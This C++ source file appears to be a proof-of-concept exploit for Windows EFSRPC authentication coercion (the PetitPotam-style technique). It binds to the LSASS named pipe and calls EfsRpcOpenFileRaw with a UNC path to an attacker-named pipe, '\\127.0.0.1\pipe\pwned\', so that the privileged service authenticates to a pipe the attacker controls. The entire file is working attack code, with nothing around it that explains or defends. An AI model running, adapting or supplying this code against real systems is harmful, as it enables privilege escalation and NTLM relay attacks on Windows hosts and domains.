#include "efsr_h.h"
#include <iostream>
#include <strsafe.h>


#pragma comment(lib, "RpcRT4.lib")


int wmain(int argc, wchar_t* argv[])
{
    RPC_STATUS status;
    RPC_WSTR StringBinding;
    RPC_BINDING_HANDLE Binding;

    status = RpcStringBindingCompose(
        NULL,                       // Interface's GUID, will be handled by NdrClientCall
        (RPC_WSTR)L"ncacn_np",      // Protocol sequence
        (RPC_WSTR)L"\\\\127.0.0.1", // Network address
        (RPC_WSTR)L"\\pipe\\lsass", // Endpoint
        NULL,                       // No options here
        &StringBinding              // Output string binding
    );

    wprintf(L"[*] RpcStringBindingCompose status code: %d\r\n", status);

    wprintf(L"[*] String binding: %ws\r\n", StringBinding);

    status = RpcBindingFromStringBinding(
        StringBinding,              // Previously created string binding
        &Binding                    // Output binding handle
    );

    wprintf(L"[*] RpcBindingFromStringBinding status code: %d\r\n", status);

    status = RpcStringFree(
        &StringBinding              // Previously created string binding
    );

    wprintf(L"[*] RpcStringFree status code: %d\r\n", status);

    RpcTryExcept
    {
        // Invoke remote procedure here
         PVOID pContext;
        LPWSTR pwszFilePath;
        long result;

        pwszFilePath = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
        StringCchPrintf(pwszFilePath, MAX_PATH, L"\\\\127.0.0.1\\pipe\\pwned\\");

        wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFilePath);
        result = Proc0_EfsRpcOpenFileRaw_Downlevel(Binding, &pContext, pwszFilePath, 0);
        wprintf(L"[*] EfsRpcOpenFileRaw status code: %d\r\n", result);

        LocalFree(pwszFilePath);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        wprintf(L"Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
    }
    RpcEndExcept

        status = RpcBindingFree(
            &Binding                    // Reference to the opened binding handle
        );

    wprintf(L"[*] RpcBindingFree status code: %d\r\n", status);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}